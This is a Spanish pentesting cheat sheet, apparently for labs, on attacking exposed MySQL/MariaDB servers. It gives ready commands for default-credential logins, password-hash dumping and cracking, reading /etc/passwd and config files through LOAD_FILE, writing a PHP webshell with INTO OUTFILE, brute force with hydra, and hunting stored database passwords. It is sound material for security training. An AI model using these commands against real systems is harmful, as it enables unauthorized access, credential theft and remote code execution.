# Base de Datos MySQL / MariaDB

> **Puerto por defecto:** `3306/TCP`

MySQL (y su fork MariaDB) es una de las bases de datos más comunes. Si está expuesta, puede permitir **acceso con credenciales por defecto**, **lectura de archivos del sistema**, extracción de hashes de usuarios de la web, e incluso **escritura de una webshell** si comparte servidor con el web.

---

## Enumeración

```bash
nmap -p3306 -sCV --script="mysql-*" <IP>
```

Scripts NSE útiles: `mysql-empty-password`, `mysql-users`, `mysql-databases`, `mysql-info`.

---

## Conexión

```bash
mysql -h <IP> -u root -p
mysql -h <IP> -u root            # sin contraseña (¡prueba siempre!)
mysql -h <IP> -u root -p'toor'
```

> **Consejo:** prueba primero `root` sin contraseña y con contraseñas típicas (`root`, `toor`, `password`, vacío). Es sorprendentemente frecuente en labs y sistemas mal configurados.

---

## Enumeración dentro de MySQL

```sql
SELECT version();
SELECT user();
SHOW DATABASES;
USE <base>;
SHOW TABLES;
SELECT * FROM users;              -- busca tablas de credenciales
SELECT user, authentication_string FROM mysql.user;   -- hashes de MySQL
```

Los hashes de `mysql.user` se crackean con hashcat (modo `300` para `mysql_native_password`).

---

## Lectura de archivos del sistema

Si el usuario tiene el privilegio `FILE`:

```sql
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/var/www/html/config.php');
```

Comprueba la variable `secure_file_priv`: si está vacía (`''`), puedes leer/escribir en cualquier ruta; si apunta a un directorio, solo ahí; si es `NULL`, está bloqueado.

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

---

## Escritura de una webshell (RCE)

Si `secure_file_priv` lo permite y MySQL corre en el mismo host que el servidor web:

```sql
SELECT '<?php system($_GET["cmd"]); ?>'
INTO OUTFILE '/var/www/html/shell.php';
```

Luego:

```bash
curl "http://<IP>/shell.php?cmd=id"
```

> **Nota:** necesitas conocer la ruta web (`/var/www/html`, `/var/www`, etc.) y que MySQL tenga permisos de escritura ahí. Es una vía directa de "acceso a BD" a "RCE".

---

## Fuerza bruta

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://<IP>
netexec mysql <IP> -u root -p passwords.txt
```

---

## Reutilización de credenciales

Las credenciales de la base de datos aparecen a menudo en archivos de configuración de la web:

```bash
grep -riE "db_pass|DB_PASSWORD|mysqli?_connect" /var/www 2>/dev/null
cat /var/www/html/wp-config.php   # WordPress
cat config.php .env
```

---

## Herramientas relacionadas

| Herramienta | Descripción |
| ----------- | ----------- |
| `mysql` | Cliente de línea de comandos. |
| `nmap` (`mysql-*`) | Enumeración de usuarios, bases y contraseñas vacías. |
| `hydra` / `netexec` | Fuerza bruta. |
| `hashcat` (modo 300) | Crackear hashes de MySQL. |

---

> **Consejo:** el orden es: **(1)** ¿root sin/ con contraseña trivial? **(2)** volcar tablas de usuarios de la aplicación (sus hashes suelen abrir la web o SSH) **(3)** ¿`FILE` priv? → leer config/`/etc/passwd` **(4)** ¿mismo host que la web? → `INTO OUTFILE` para webshell. Y recuerda: las credenciales de BD se reutilizan muchísimo para SSH y paneles web.
